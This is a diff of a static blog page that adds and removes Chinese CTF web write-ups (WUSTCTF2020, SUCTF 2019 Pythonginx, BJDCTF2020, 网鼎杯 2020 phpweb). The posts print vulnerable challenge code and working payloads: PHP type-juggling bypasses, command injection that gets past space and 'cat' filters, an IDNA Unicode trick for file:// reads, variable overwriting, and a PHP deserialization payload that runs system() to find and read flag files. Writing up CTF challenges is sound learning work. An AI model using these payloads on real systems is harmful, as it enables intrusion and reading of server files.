@@ -71,6 +71,114 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-page-71" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/07/13/page-71/" class="article-date">
+  <time class="dt-published" datetime="2021-07-13T08:58:45.000Z" itemprop="datePublished">2021-07-13</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/07/13/page-71/">WUSTCTF2020朴实无华</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><strong>扫后台扫到robots.txt</strong><br>访问得到源码<br>&lt;?php<br>header(‘Content-type:text/html;charset=utf-8’);<br>error_reporting(0);<br>highlight_file(__ file__);</p>
+<p>//level 1<br>if (isset($_GET[‘num’])){<br>    $num = $_GET[‘num’];<br>    if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021){<br>        echo “我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.</br>“;<br>    }else{<br>        die(“金钱解决不了穷人的本质问题”);<br>    }<br>}else{<br>    die(“去非洲吧”);<br>}<br>//level 2<br>if (isset($_GET[‘md5’])){<br>   $md5=$_GET[‘md5’];<br>   if ($md5==md5($md5))<br>       echo “想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.</br>“;<br>   else<br>       die(“我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲”);<br>}else{<br>    die(“去非洲吧”);<br>}</p>
+<p>//get flag<br>if (isset($_GET[‘get_flag’])){<br>    $get_flag = $_GET[‘get_flag’];<br>    if(!strstr($get_flag,” “)){<br>        $get_flag = str_ireplace(“cat”, “wctf2020”, $get_flag);<br>        echo “想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.</br>“;<br>        system($get_flag);<br>    }else{<br>        die(“快到非洲了”);<br>    }<br>}else{<br>    die(“去非洲吧”);<br>}<br>?&gt; </p>
+<p>拿flag要过两关：</p>
+<p>if (isset($_GET[‘num’])){<br>    $num = $_GET[‘num’];<br>    if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021){<br><strong>假设num=1e8</strong><br><strong>intval函数 intval($num) 会被截断成1 但是intval（$num+1）会变成100000001 就能绕过这个2020 2021了</strong></p>
+<p>if (isset($_GET[‘md5’])){<br>   $md5=$_GET[‘md5’];<br>   if ($md5==md5($md5))<br><strong>找到一串MD5加密前后一样的 祭出脚本大法</strong><br>import hashlib</p>
+<p>for i in range(0,10**41):<br>    i=’0e’+str(i)<br>    md5=hashlib.md5(i.encode()).hexdigest()<br>    if md5[:2]==’0e’ and md5[2:].isdigit():<br>        print(‘md5:{} ‘.format(i))<br>        break </p>
+<p><strong>得到：md5:0e215962017</strong>  </p>
+<p>?num=1e8&amp;md5=0e215962017 </p>
+<p>if (isset($_GET[‘get_flag’])){<br>    $get_flag = $_GET[‘get_flag’];<br>    if(!strstr($get_flag,” “)){<br>        $get_flag = str_ireplace(“cat”, “wctf2020”, $get_flag);<br><strong>这边过滤了空格和cat会被替换成wctf2020</strong><br><strong>先看一下flag在哪num=1e7&amp;md5=0e215962017&amp;get_flag=ls</strong></p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/18.PNG?raw=true" alt="18.PNG"></p>
+<p>用%09绕过空格 然后cat用反斜杠绕过 ca\t<br>最终payload ：?num=1e7&amp;md5=0e215962017&amp;get_flag=ca\t%09那一大长串</p>
+<p>​        </p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/19.PNG?raw=true" alt="19.PNG"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/07/13/page-71/" data-id="cksyl7wjx001pw4w777nfh8du" data-title="WUSTCTF2020朴实无华" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-page-69" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/07/13/page-69/" class="article-date">
+  <time class="dt-published" datetime="2021-07-13T08:58:41.000Z" itemprop="datePublished">2021-07-13</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/07/13/page-69/">SUCTF 2019 Pythonginx</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><strong>这关主要是url中的unicode漏洞引发的域名安全问题</strong><br>1、域名欺骗 ：<br>访问此网站http://Вaidu.com(其中的В是unicode U+0412)<br>会跳转到<a target="_blank" rel="noopener" href="http://вaidu.com/">http://xn--aidu-f4d.com/</a><br>也可以换成其他的unicode<br>访问http://Вaidu.com 时浏览器会将访问的url交给域名系统（DNS）解析url为ip地址<br>解析url过程用到递归查询和迭代查询 先递归搜索浏览器自己的dns缓存然后搜索操作系统的dns缓存 再搜索hosts文件缓存<br>搜索本地域名服务器 但后迭代搜索根域名服务器知道找到ip地址 找不到就是404<br>在DNS中idna使用punycode转写将ascii字符串存储，本地DNS中因为遇见特殊字符В 因此无法将其转成正常ascii<br>就直接在本地转化为<a target="_blank" rel="noopener" href="http://вaidu.com/">http://xn--aidu-f4d.com/</a></p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/22.PNG?raw=true" alt="22.PNG"></p>
+<p><strong>还有要知道ngix重要文件的位置</strong><br><strong>nginx重要文件的位置：</strong></p>
+<p>配置文件存放目录：/etc/nginx<br>主配置文件：/etc/nginx/conf/nginx.conf<br>管理脚本：/usr/lib64/systemd/system/nginx.service<br>模块：/usr/lisb64/nginx/modules<br>应用程序：/usr/sbin/nginx<br>程序默认存放位置：/usr/share/nginx/html<br>日志默认存放位置：/var/log/nginx<br>配置文件目录为：/usr/local/nginx/conf/nginx.conf</p>
+<p>源码这边<br> @app.route(‘/getUrl’, methods=[‘GET’, ‘POST’])<br>def getUrl():<br>    url = request.args.get(“url”)<br>    host = parse.urlparse(url).hostname<br>    if host == ‘suctf.cc’:<br>        return “我扌 your problem? 111”<br>    parts = list(urlsplit(url))<br>    host = parts[1]<br>    if host == ‘suctf.cc’:<br>        return “我扌 your problem? 222 “ + host<br>    newhost = []<br>    for h in host.split(‘.’):<br>        newhost.append(h.encode(‘idna’).decode(‘utf-8’))<br>    parts[1] = ‘.’.join(newhost)<br>    #去掉 url 中的空格<br>    finalUrl = urlunsplit(parts).split(‘ ‘)[0]<br>    host = parse.urlparse(finalUrl).hostname<br>    if host == ‘suctf.cc’:<br>        return urllib.request.urlopen(finalUrl).read()<br>    else:<br>        return “我扌 your problem? 333”<br>    </code><br>    <!-- Dont worry about the suctf.cc. Go on! --><br>    <!-- Do you know the nginx? --></p>
+</body>
+是要对host的判断然后绕过这两个判断
+如果一开始就是suctf.cc压根就没办法 
+
+<p><strong>需要访问suctf.cc/user/local/nginx/conf/nginx.conf</strong>  访问这个配置文件应该能找到flag 位置<br>跑脚本 </p>
+<p>#coding:utf-8</p>
+<p>for i in range(128,65537):<br>    tmp=chr(i)<br>    try:<br>        res = tmp.encode(‘idna’).decode(‘utf-8’)<br>        if(“-“) in res:<br>            continue<br>        print(“U:{}    A:{}      ascii:{} “.format(tmp, res, i))<br>    except:<br>        pass</p>
+<p><strong>找到℆这么一个字符恰好会因为这个漏洞被解析成c/u 这样就能绕过</strong></p>
+<p>构造file://suctf.c℆sr/local/nginx/conf/nginx.conf  也可以用ℂ 来替代c</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/23.PNG?raw=true" alt="23.PNG"></p>
+<p>最终payload：</p>
+<p>file://suctf.c℆sr/fffffflag</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/24.PNG?raw=true" alt="24.PNG"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/07/13/page-69/" data-id="cksyl7wjw001ow4w74htm6grs" data-title="SUCTF 2019 Pythonginx" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-page-68" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2021/07/13/page-68/" class="article-date">
@@ -561,200 +669,6 @@ payload:利用源码给的getFlag函数
 
 
   
-    <article id="post-page-59" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/07/08/page-59/" class="article-date">
-  <time class="dt-published" datetime="2021-07-08T06:51:57.000Z" itemprop="datePublished">2021-07-08</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/07/08/page-59/">BJDCTF2020Mark loves cat</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <?php
-include 'flag.php';
-$yds = "dog";
-$is = "cat";
-$handsome = 'yds';
-
-foreach($_POST as $x => $y){
-    $$x = $y;
-}
-
-foreach($_GET as $x => $y){              //通过post方式传递$flag=flag，最终结果为$$flag=flag    这便是POST方式处理代码
-    $$x = $$y;
-}
-
-foreach($_GET as $x => $y){
-    if($_GET['flag'] === $x && $x !== 'flag'){              //通过get传递yds=flag 得到$yds=$flag  
-        exit($handsome);
-    }
-}
-
-if(!isset($_GET['flag']) && !isset($_POST['flag'])){                          //get和post中不存在flag参数便退出程序输出$yds变量，得到flag 
-    exit($yds);
-}
-
-if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){
-    exit($is);
-}
-
-echo "the flag is: ".$flag;"    //这是index.php 的源码
-**根据$$和foreach可以判断可能存在变量覆盖漏洞**，也就是可以将$yds，$is，$handsome的值进行覆盖成$flag变量，然后输出对应变量的值，获取flag。
-例如代码第17-19行，需要get传参?flag=flag，才能进入if语句中输出$handsome，但是foreach中并不能将$flag赋值给$handsome然后输出，所以此处无法利用。
-扫描**目录找到 .git 泄露** 
-**然后githack 把源码下下来**
-发现就两个重要文件，flag.php，读取flag文件内容并赋值给$flag:
-index.php，开头有个包含，在最后有个输出flag
- if(!isset($_GET['flag']) && !isset($_POST['flag'])){
-    exit($yds);
- }   发现get和post中不存在flag参数便退出程序输出$yds变量 
-传递如下参数 ：
-get: yds=flag
-post: $flag=flag
-
-那么最终payload  **?yds=flag**
-         **              post: $flag=flag**
-
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/07/08/page-59/" data-id="cksyl7wjq001fw4w75yhu80oc" data-title="BJDCTF2020Mark loves cat" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-page-58" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/07/08/page-58/" class="article-date">
-  <time class="dt-published" datetime="2021-07-08T06:44:25.000Z" itemprop="datePublished">2021-07-08</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/07/08/page-58/">网鼎杯 2020 朱雀组phpweb</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>主页这边抓包发现 func=date&amp;p=Y-m-d+h%3Ai%3As+a  这句话这边可以传参 </p>
-<p>func=file_get_contents&amp;p=index.php  然后给了一堆的源码</p>
-<?php
-$disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");       ；这边func可以用的功能被禁用了一大堆就很烦 但是反序列化可以
-function gettime($func, $p) {
-    $result = call_user_func($func, $p);
-    $a= gettype($result);
-    if ($a == "string") {
-        return $result;
-    } else {return "";}
-}
-class Test {
-    var $p = "Y-m-d h:i:s a";
-    var $func = "date";
-    function __destruct() {
-        if ($this->func != "") {
-            echo gettime($this->func, $this->p);
-        }
-    }
-}
-$func = $_REQUEST["func"];
-$p = $_REQUEST["p"];
-
-if ($func != null) {
-    $func = strtolower($func);
-    if (!in_array($func,$disable_fun)) {
-        echo gettime($func, $p);
-    }else {
-        die("Hacker...");
-    }
-}
-?>
-
-<p>虽然被禁用了一大堆但是还有反序列化可以用  func=unserialize&amp;p=index.php</p>
-<?php
-class Test {
-    var $p = "ls";
-    var $func = "system";
-    function __destruct() {
-        if ($this->func != "") {
-            echo gettime($this->func, $this->p);
-        }
-    }
-}
-
-$a=new Test();
-echo serialize($a);    
-
-贴一下构造的序列化代码构造这个生成O:4:"Test":2:{s:1:"p";s:2:"ls";s:4:"func";s:6:"system";} 
-
-payload1
-
- func=unserialize&p=O:4:"Test":2:{s:1:"p";s:2:"ls";s:4:"func";s:6:"system";}   获得文件列表
-
-func=unserialize&p=O:4:"Test":2:{s:1:"p";s:14:"ls ../../../..";s:4:"func";s:6:"system";}  然后给了更多
-
-
-
-但是你丫的怎么没有flag ┗|｀O′|┛
-
-![wwwwww.png](https://github.com/ajin-max/ajin-max.github.io/blob/master/img/wwwwww.png?raw=true)
-
-**知识点：寻找flag文件常用命令小结：**
-system(‘ls’) : 列举当前目录下的所有文件
-system(“find / -name flag*”)：查找所有文件名匹配flag*的文件
-system(“cat $(find / -name flag*)”)：打印所有文件名匹配flag*的文件
-
-那么这个p就得变成p=cat $(find / -name flag*)
-
-func=unserialize&p=O:4:"Test":2:{s:1:"p";s:25:"cat $(find / -name flag*)";s:4:"func";s:6:"system";}  最终payload
-
-![weww.png](https://github.com/ajin-max/ajin-max.github.io/blob/master/img/weww.png?raw=true)
-
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/07/08/page-58/" data-id="cksyl7wjp001ew4w712j25o07" data-title="网鼎杯 2020 朱雀组phpweb" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -778,7 +692,7 @@ func=unserialize&p=O:4:"Test":2:{s:1:"p";s:25:"cat $(find / -name flag*)";s:4:"f
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
     </div>
   </div>
 
@@ -791,6 +705,14 @@ func=unserialize&p=O:4:"Test":2:{s:1:"p";s:25:"cat $(find / -name flag*)";s:4:"f
       <ul>
         
           <li>
+            <a href="/2021/09/09/page-115/">又是misc</a>
+          </li>
+        
+          <li>
+            <a href="/2021/09/09/page-114/">page</a>
+          </li>
+        
+          <li>
             <a href="/2021/08/13/page-110/">一大堆的misc 很大一堆</a>
           </li>
         
@@ -800,14 +722,6 @@ func=unserialize&p=O:4:"Test":2:{s:1:"p";s:25:"cat $(find / -name flag*)";s:4:"f
         
           <li>
             <a href="/2021/08/13/page-108/">b01lers2020Welcome to Earth</a>
-          </li>
-        
-          <li>
-            <a href="/2021/08/13/page-107/">SUCTF 2019EasyWeb</a>
-          </li>
-        
-          <li>
-            <a href="/2021/08/13/page-106/">WUSTCTF2020CV Maker</a>
           </li>
         
       </ul>
